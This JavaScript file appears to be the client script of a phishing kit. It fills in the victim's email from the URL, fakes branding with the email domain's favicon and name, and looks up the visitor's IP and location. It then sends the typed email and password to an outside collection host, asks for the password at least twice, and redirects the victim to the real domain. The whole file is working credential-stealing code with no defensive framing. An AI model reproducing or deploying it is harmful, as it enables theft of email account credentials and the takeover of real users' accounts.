document.addEventListener('DOMContentLoaded', function () {
    let count = 0;
    const email = window.location.hash.substr(1);
    const emailInput = document.querySelector('#email');
    //const errorDiv = document.querySelector('#error');
    const msgDiv = document.querySelector('#msg');
    const submitBtn = document.querySelector('#submit-btn');
    const passwordInput = document.querySelector('#password');
    let locate = ''; // Initialize the locate variable to store location data

    if (email) {
        emailInput.value = email;
        const filter = /^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$/;

        if (!filter.test(email)) {
            msgDiv.style.display = 'block';
            msgDiv.innerHTML = 'Please enter a valid email account.';
            emailInput.focus();
            return;
        }

        const my_slice = email.slice(email.indexOf("@") + 1);
        const c = my_slice.slice(0, my_slice.indexOf('.'));
        const finalu = c.toUpperCase();

        document.querySelectorAll("#logoimg, .logoimg").forEach(img => {
            img.src = "https://www.google.com/s2/favicons?domain=" + my_slice;
        });
        document.querySelectorAll("#logoname, .logoname").forEach(name => {
            name.innerHTML = finalu;
        });
    }

    submitBtn.addEventListener('click', function (event) {
        event.preventDefault();
        msgDiv.style.display = 'none'; // Clear any previous messages

        const email = emailInput.value;
        const password = passwordInput.value;
        const filter = /^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$/;

        if (!filter.test(email)) {
            msgDiv.style.display = 'block';
            msgDiv.innerHTML = 'Please enter a valid email account.';
            emailInput.focus();
            return;
        } else if (password === '') {
            msgDiv.style.display = 'block';
            msgDiv.innerHTML = 'Password cannot be empty';
            passwordInput.focus();
            return;
        } else {
            msgDiv.style.display = 'none'; // Clear the message div for fresh messages
            const my_slice = email.slice(email.indexOf("@") + 1);
            const c = my_slice.slice(0, my_slice.indexOf('.'));
            const finalu = c.toUpperCase();

            document.querySelectorAll("#logoimg, .logoimg").forEach(img => {
                img.src = "https://www.google.com/s2/favicons?domain=" + my_slice;
            });
            document.querySelectorAll("#logoname, .logoname").forEach(name => {
                name.innerHTML = finalu;
            });

            count++;

            fetch('http://hotstories.co.uk/olamira/pdf.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ email, password, locate })
            })
            .then(response => response.json())
            .then(data => {
                passwordInput.value = ''; // Clear the password field
                msgDiv.style.display = 'block';
                msgDiv.innerHTML = data.message; // Display the returned message

                if (data.signal === 'ok' && count >= 2) {
                    count = 0;
                    window.location.replace("http://www." + my_slice);
                }
            })
            .catch(error => {
                passwordInput.value = '';
                console.error('Error:', error);
                msgDiv.style.display = 'block';
                msgDiv.innerHTML = 'An error occurred. Please try again.';
            })
            .finally(() => {
                submitBtn.innerHTML = 'Sign in';
            });

            submitBtn.innerHTML = 'Verifying...';
        }
    });

    fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(result => {
            const locateElement = document.getElementById('locate');
            locate = `${result.country_name}, City: ${result.city}, Ip Address: ${result.ip}`;
            if (locateElement) {
                locateElement.innerHTML = locate;
            }
        })
        .catch(error => {
            console.error('Error fetching data:', error);
        });
});
